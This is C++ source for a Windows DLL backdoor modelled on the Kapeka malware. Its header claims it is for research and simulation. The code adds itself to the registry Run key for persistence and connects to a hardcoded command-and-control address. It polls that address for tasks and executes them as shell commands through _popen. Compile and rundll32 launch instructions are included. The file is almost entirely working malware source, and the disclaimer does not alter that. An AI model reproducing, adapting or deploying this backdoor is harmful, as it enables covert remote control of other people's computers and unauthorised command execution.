// Permissions: Ensure that you have the necessary permissions to execute and test the DLL on the Windows system.
// Dependencies: The DLL relies on the Winsock library (Ws2_32.lib), which is standard on Windows, so no additional dependencies are required.
// Anti-Virus: Be aware that many anti-virus programs will detect and block backdoor-like activities. This is intended to be an educational example, and any malicious use is illegal and unethical.

// Disclaimer: this backdoor for research & simulation, i am not responsible if anyone uses this payload for illegal purposes

// Author: S3N4T0R
// Date: 2024-6-13

// manual compile: x86_64-w64-mingw32-g++ -shared -o kapeka_backdoor.dll kapeka_backdoor.cpp -lws2_32

// Run the DLL: rundll32.exe kapeka_backdoor.dll,ExportedFunction -d

#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <thread>
#include <string>
#include <fstream>
#include <vector>

#pragma comment(linker, "/EXPORT:ExportedFunction=_ExportedFunction@0,PRIVATE")
#pragma comment(lib, "Ws2_32.lib")

#define C2_SERVER_IP "192.168.1.7"
#define C2_SERVER_PORT 7777

extern "C" __declspec(dllexport) void ExportedFunction();

void primary_thread(HANDLE exit_event, HANDLE new_task_event);
void logoff_monitor_thread(HANDLE exit_event);
void task_monitor_thread(HANDLE new_task_event, HANDLE task_completed_event);
void task_completion_monitor_thread(HANDLE task_completed_event);
std::string execute_command(const std::string& cmd);
std::vector<std::string> split(const std::string& str, const std::string& delimiter);
void log(const std::string& message);
bool initialize_winsock();
SOCKET connect_to_c2();
void close_socket(SOCKET sock);
void send_data(SOCKET sock, const std::string& data);
std::string receive_data(SOCKET sock);

HANDLE exit_event;
HANDLE new_task_event;
HANDLE task_completed_event;

extern "C" __declspec(dllexport) void ExportedFunction() {
    // This function is exported by ordinal
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH: {
            char cmdLine[MAX_PATH];
            GetModuleFileNameA(hModule, cmdLine, MAX_PATH);
            std::string cmd = GetCommandLineA();
            
            exit_event = CreateEvent(NULL, TRUE, FALSE, NULL);
            new_task_event = CreateEvent(NULL, TRUE, FALSE, NULL);
            task_completed_event = CreateEvent(NULL, TRUE, FALSE, NULL);

            if (cmd.find("-d") != std::string::npos) {
                // Initial run tasks (e.g., adding to startup)
                HKEY hKey;
                RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
                RegSetValueEx(hKey, "KapekaBackdoor", 0, REG_SZ, (BYTE *)cmdLine, strlen(cmdLine) + 1);
                RegCloseKey(hKey);
            }

            std::thread(primary_thread, exit_event, new_task_event).detach();
            std::thread(logoff_monitor_thread, exit_event).detach();
            std::thread(task_monitor_thread, new_task_event, task_completed_event).detach();
            std::thread(task_completion_monitor_thread, task_completed_event).detach();
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            SetEvent(exit_event);
            CloseHandle(exit_event);
            CloseHandle(new_task_event);
            CloseHandle(task_completed_event);
            break;
    }
    return TRUE;
}

void primary_thread(HANDLE exit_event, HANDLE new_task_event) {
    if (!initialize_winsock()) {
        log("Primary thread: Failed to initialize Winsock.");
        return;
    }

    SOCKET c2_socket = connect_to_c2();
    if (c2_socket == INVALID_SOCKET) {
        log("Primary thread: Failed to connect to C2 server.");
        WSACleanup();
        return;
    }

    while (WaitForSingleObject(exit_event, 1000) == WAIT_TIMEOUT) {
        // Poll C2 server for tasks or updated configuration.
        log("Primary thread: Polling C2 server...");

        send_data(c2_socket, "poll");
        std::string response = receive_data(c2_socket);

        if (!response.empty()) {
            log("Primary thread: Received task.");
            std::ofstream out("tasks.txt");
            out << response;
            out.close();
            SetEvent(new_task_event);
        }
        Sleep(5000); // Simulate delay between polls
    }

    close_socket(c2_socket);
    WSACleanup();
    log("Primary thread: Exiting...");
}

void logoff_monitor_thread(HANDLE exit_event) {
    while (WaitForSingleObject(exit_event, 1000) == WAIT_TIMEOUT) {
        // Monitor for log off events.
        log("Logoff monitor thread: Checking for logoff events...");
        Sleep(10000); // Simulate time delay between checks
    }
    log("Logoff monitor thread: Exiting...");
}

void task_monitor_thread(HANDLE new_task_event, HANDLE task_completed_event) {
    while (WaitForSingleObject(new_task_event, 1000) == WAIT_TIMEOUT) {
        // Monitor for new tasks to process.
        log("Task monitor thread: Waiting for new tasks...");

        std::ifstream in("tasks.txt");
        std::string line;
        while (std::getline(in, line)) {
            log("Processing task: " + line);
            std::string result = execute_command(line);
            log("Task result: " + result);
        }
        in.close();

        SetEvent(task_completed_event);
        Sleep(1000); // Simulate processing delay
    }
    log("Task monitor thread: Exiting...");
}

void task_completion_monitor_thread(HANDLE task_completed_event) {
    while (WaitForSingleObject(task_completed_event, 1000) == WAIT_TIMEOUT) {
        // Monitor for task completion.
        log("Task completion monitor thread: Task completed.");

        // Simulate sending back results to C2 server
        std::ofstream out("results.txt", std::ios_base::app);
        out << "Task completed successfully\n";
        out.close();

        ResetEvent(task_completed_event);
    }
    log("Task completion monitor thread: Exiting...");
}

std::string execute_command(const std::string& cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) {
        return "popen failed!";
    }
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        result += buffer;
    }
    _pclose(pipe);
    return result;
}

std::vector<std::string> split(const std::string& str, const std::string& delimiter) {
    std::vector<std::string> tokens;
    size_t prev = 0, pos = 0;
    do {
        pos = str.find(delimiter, prev);
        if (pos == std::string::npos) pos = str.length();
        std::string token = str.substr(prev, pos - prev);
        if (!token.empty()) tokens.push_back(token);
        prev = pos + delimiter.length();
    } while (pos < str.length() && prev < str.length());
    return tokens;
}

void log(const std::string& message) {
    std::ofstream logFile("log.txt", std::ios_base::app);
    logFile << message << std::endl;
}

bool initialize_winsock() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        log("Winsock initialization failed.");
        return false;
    }
    return true;
}

SOCKET connect_to_c2() {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        log("Socket creation failed.");
        return INVALID_SOCKET;
    }

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(C2_SERVER_IP);
    server.sin_port = htons(C2_SERVER_PORT);

    if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        log("Connection to C2 server failed.");
        closesocket(sock);
        return INVALID_SOCKET;
    }

    log("Connected to C2 server.");
    return sock;
}

void close_socket(SOCKET sock) {
    closesocket(sock);
    log("Socket closed.");
}

void send_data(SOCKET sock, const std::string& data) {
    send(sock, data.c_str(), data.length(), 0);
    log("Data sent: " + data);
}

std::string receive_data(SOCKET sock) {
    char buffer[512];
    int bytesReceived = recv(sock, buffer, sizeof(buffer), 0);
    if (bytesReceived == SOCKET_ERROR) {
        log("Receive data failed.");
        return "";
    }
    buffer[bytesReceived] = '\0';
    std::string data(buffer);
    log("Data received: " + data);
    return data;
}

